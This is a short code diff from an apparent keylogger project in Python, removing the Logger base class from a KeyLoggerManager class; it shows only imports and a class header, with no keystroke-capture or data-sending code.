@@ -3,7 +3,7 @@ from KeyloggerService import KeyLoggerService, Logger
 from KeyloggerAgent.FileWrite import FileWriter
 
 
-class KeyLoggerManager(Logger):
+class KeyLoggerManager():
 
     def __init__(self):
         self.service = KeyLoggerService()
